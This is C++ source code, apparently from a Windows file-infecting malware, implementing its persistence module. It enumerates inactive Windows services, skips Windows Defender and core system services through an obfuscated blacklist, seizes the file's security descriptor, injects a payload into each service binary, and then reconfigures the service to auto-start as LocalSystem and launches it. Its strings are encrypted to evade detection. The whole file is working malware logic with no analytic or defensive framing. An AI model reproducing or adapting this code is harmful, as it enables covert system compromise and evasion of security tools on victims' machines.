#include "persistence.hpp"
#include "shlwapi.h"
#include "strings.hpp"

static BOOL isBlacklisted(PWCHAR pwString, PWCHAR *pwBlacklistArray, UINT iElementAmount, BOOL bPath)
{

	// на wd начинаются службы windows defender 
	if (!bPath)
	{
		if ((pwString[0] == L'w') && (pwString[1] == L'd'))
			return TRUE;
	}

	for (UINT i = 0; i < iElementAmount; i++)
	{
		if (StrStrIW(pwString, pwBlacklistArray[i]))
			return TRUE;
	}

	return FALSE;
}

static DWORD WINAPI infect_inactive_service(SC_HANDLE hSCManager, LPENUM_SERVICE_STATUS_PROCESSW pssp, LPVOID lpParameter, SIZE_T dwParamsize)
{
#ifdef _DEBUG
	WCHAR debugOut[10240];
	wsprintfW(debugOut, L"[infect_inactive_service] DisplayName = %s, ServiceName = %s", pssp->lpDisplayName, pssp->lpServiceName);
	WriteLog(debugOut);
#endif

	CCryptString cStr_windefend(cryptedstr_windefend);
	CCryptString cStr_ui0detect(cryptedstr_ui0detect);
	CCryptString cStr_svchost(cryptedstr_svchost);
	CCryptString cStr_trustedinstaller(cryptedstr_trustedinstaller);
	CCryptString cStr_dllhost(cryptedstr_dllhost);

	CCryptString cStr_localsystem(cryptedstr_localsystem);
	
	DWORD dwStartType = 0;

	IAccessManager *access = nullptr;
	const UINT iAmount = 5;
	PWCHAR pwBlacklist[iAmount];
	pwBlacklist[0] = cStr_windefend.w_str();
	pwBlacklist[1] = cStr_ui0detect.w_str();
	pwBlacklist[2] = cStr_svchost.w_str();
	pwBlacklist[3] = cStr_trustedinstaller.w_str();
	pwBlacklist[4] = cStr_dllhost.w_str();

	if (isBlacklisted(pssp->lpServiceName, pwBlacklist, iAmount, FALSE))
	{
#ifdef _DEBUG
		WriteLog(L"[infect_inactive_service] blacklisted service name");
#endif
		return 0;
	}

	LPBYTE lpServiceConfigData = nullptr;
	DWORD dwBytesNeeded = 0;
	SC_HANDLE hService = OpenServiceW(hSCManager, pssp->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
	do
	{
		if (hService == NULL)
		{
			break;
		}

		if ((!QueryServiceConfigW(hService, NULL, 0, &dwBytesNeeded)) && (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
		{
			break;
		}

		lpServiceConfigData = new BYTE[dwBytesNeeded + 1];
		if (lpServiceConfigData == nullptr)
			break;

		if (!QueryServiceConfigW(hService, (LPQUERY_SERVICE_CONFIGW)lpServiceConfigData, dwBytesNeeded, &dwBytesNeeded))
		{
			break;
		}

		LPQUERY_SERVICE_CONFIGW lpqsc = (LPQUERY_SERVICE_CONFIGW)lpServiceConfigData;

		PathRemoveArgsW(lpqsc->lpBinaryPathName);
		PathUnquoteSpacesW(lpqsc->lpBinaryPathName);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[infect_inactive_service] Service start name = %s, binary path = %s", lpqsc->lpServiceStartName, lpqsc->lpBinaryPathName);
		WriteLog(debugOut);
#endif

		if (isBlacklisted(lpqsc->lpBinaryPathName, pwBlacklist, iAmount, TRUE))
		{
#ifdef _DEBUG
			WriteLog(L"[infect_inactive_service] blacklisted path");
#endif
			break;
		}

		if (wcslen(lpqsc->lpBinaryPathName) >= (sizeof(WIN32_FIND_DATA::cFileName) / sizeof(WCHAR)))
			break;

		access = (IAccessManager*)new FileSecurityManager;
		if (access == nullptr)
			break;

		if (!access->init(lpqsc->lpBinaryPathName, DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION))
		{
#ifdef _DEBUG
			WriteLog(L"[infect_inactive_service] cant get dacl and owner info");
#endif
			break;
		}

		if (!access->get(DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION))
		{
#ifdef _DEBUG

			WriteLog(L"[infect_inactive_service] cant set new DACL and owner to file");
#endif
			break;
		}

		WIN32_FIND_DATAW wfd;
		RtlSecureZeroMemory(&wfd, sizeof(wfd));

		wcscpy(wfd.cFileName, lpqsc->lpBinaryPathName);

		if (preprocessing::ProcessFile(lpqsc->lpBinaryPathName, &wfd, (LPBYTE)lpParameter, dwParamsize) != ERROR_SUCCESS)
		{
#ifdef _DEBUG
			WriteLog(L"[infect_inactive_service] error cant infect service binary");
#endif
			break;
		}
		
		

		dwStartType = SERVICE_NO_CHANGE;
		if (lpqsc->dwStartType != SERVICE_AUTO_START)
			dwStartType = SERVICE_AUTO_START;

		if (!ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, dwStartType, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, cStr_localsystem.w_str(), NULL, NULL))
		{
#ifdef _DEBUG
			WriteLog(L"[infect_inactive_service] cant change service config");
#endif
			break;
		}

		BOOL bServiceStart = StartServiceW(hService, 0, NULL);
#ifdef _DEBUG
		if (bServiceStart)
			WriteLog(L"[infect_inactive_service] successfully started service");
		else
			WriteLog(L"[infect_inactive_service] cant start service");
#endif
		

	} while (FALSE);

	if (hService != NULL)
		CloseServiceHandle(hService);

	if (lpServiceConfigData != nullptr)
	{
		delete[]lpServiceConfigData;
		lpServiceConfigData = nullptr;
	}

	if (access != nullptr)
		delete access;

	return 0;
}

BOOL elevated_persistence::service(capsidProcessingForm *cpf)
{
	BOOL bRet = FALSE;

#ifdef _DEBUG
	WriteLog(L"[elevated_persistence::service] infecting services...");
#endif

	service_api::enumerate(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE, SERVICE_INACTIVE, (service_api::fnCallbackOnFound)infect_inactive_service, cpf, sizeof(capsidProcessingForm));

	return bRet;
}

BOOL elevated_persistence::tools(capsidProcessingForm *cpf)
{
	BOOL bRet = FALSE;

#ifdef _DEBUG
	WriteLog(L"[elevated_persistence::tools] infecting common tools...");
#endif


	return bRet;
}

BOOL elevated_persistence::exec_all(capsidProcessingForm * cpf)
{
	if (global_data::dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
		return FALSE;

	CCryptString cStr_IsWow64Process(ascii_cryptedstr_IsWow64Process);
	CCryptString cStr_Wow64Revert(ascii_cryptedstr_Wow64RevertWow64FsRedirection);
	CCryptString cStr_Wow64Disable(ascii_cryptedstr_Wow64DisableWow64FsRedirection);
	CCryptString cStr_kernel32(cryptedstr_kernel32);

	BOOL bWow64Process = FALSE;
	fnWow64DisableWow64FsRedirection _Wow64DisableWow64FsRedirection = nullptr;
	fnWow64RevertWow64FsRedirection _Wow64RevertWow64FsRedirection = nullptr;
	fnIsWow64Process _IsWow64Process = nullptr;
	HMODULE hKernel32 = NULL;

	BOOL bRedirectsDisabled = FALSE;
	PVOID OldValue = nullptr;

#ifndef _WIN64
	// отключим редирект если мы в x86 коде, редирект есть не везде, так что динамически импортируем функции и в случае какого либо проеба просто продолжим выполнение
	do
	{
		hKernel32 = GetModuleHandleW(cStr_kernel32.w_str());
		if (hKernel32 == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[elevated_persistence::exec_all] cant get kernel32 hmodule");
#endif
			break;
		}

		_Wow64DisableWow64FsRedirection = (fnWow64DisableWow64FsRedirection)GetProcAddress(hKernel32, cStr_Wow64Disable.c_str());
		_Wow64RevertWow64FsRedirection = (fnWow64RevertWow64FsRedirection)GetProcAddress(hKernel32, cStr_Wow64Revert.c_str());
		_IsWow64Process = (fnIsWow64Process)GetProcAddress(hKernel32, cStr_IsWow64Process.c_str());

		if ((_Wow64DisableWow64FsRedirection == nullptr) || (_Wow64RevertWow64FsRedirection == nullptr) || (_IsWow64Process == nullptr))
		{
#ifdef _DEBUG
			WriteLog(L"[elevated_persistence::exec_all] no wow64 functions were found");
#endif 
			break;
		}

		if (!_IsWow64Process(GetCurrentProcess(), &bWow64Process))
		{
#ifdef _DEBUG
			WriteLog(L"[elevated_persistence::exec_all] IsWow64Process failed");
#endif
			break;
		}

		if (bWow64Process == FALSE)
		{
#ifdef _DEBUG
			WriteLog(L"[elevated_persistence::exec_all] we are running on x86 system, no need in disable wow64");
#endif
			break;
		}

		// мы запущены под x64 системой в x86 коде, отключим редиректы

		bRedirectsDisabled = _Wow64DisableWow64FsRedirection(&OldValue);
		
#ifdef _DEBUG
		if (bRedirectsDisabled)
			WriteLog(L"[elevated_persistence::exec_all] disabled wow64 redirects");
		else
			WriteLog(L"[elevated_persistence::exec_all] cant disable wow64 redirects");
#endif

	} while (FALSE);
#endif

	// выполним установку закрепа
	BOOL bRet = TRUE;
	bRet &= elevated_persistence::service(cpf);
	bRet &= elevated_persistence::tools(cpf);

#ifndef _WIN64
	if (bRedirectsDisabled)
	{
		if (!_Wow64RevertWow64FsRedirection(OldValue))
		{
#ifdef _DEBUG
			WriteLog(L"[CRITICAL ERROR!!!!!!!!!!!!!!!!] Cant revert wow64 redirection, ATTENTION!!!");
#endif
		}
	}
#endif
	
	return 0;
}

BOOL userland_persisence::relocate(capsidProcessingForm *cpf)
{
	BOOL bRet = FALSE;

#ifdef _DEBUG
	WriteLog(L"[userland_persisence::relocate] relocating common tool from windir to userland folder and infecting it ...");
#endif


	return bRet;
}

BOOL exec_persistence(capsidProcessingForm * cpf)
{
	if ((global_data::pExtendedDataCopy != nullptr) && (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_PERSIST))
	{
#ifdef _DEBUG
		WriteLog(L"[exec_persistence] M0YV_FNO_PERSIST flag is set, exiting from persistence...");
#endif
		return TRUE;
	}

	BOOL bRet = FALSE;

	bRet |= elevated_persistence::exec_all(cpf);

	return bRet;
}
